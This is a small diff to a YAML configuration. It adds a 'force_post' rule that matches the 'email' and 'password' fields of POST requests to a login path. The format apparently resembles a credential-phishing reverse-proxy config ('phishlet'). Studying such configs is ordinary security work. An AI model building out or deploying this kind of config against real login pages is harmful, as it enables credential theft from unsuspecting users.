@@ -32,3 +32,11 @@ auth_urls:
 login:
   domain: '{domain}'
   path: '/login'
+
+force_post:
+  - path: '/login'
+    search:
+      - {key: 'email', search: '(.*)'}
+      - {key: 'password', search: '(.*)'}
+    force: []
+    type: 'post'
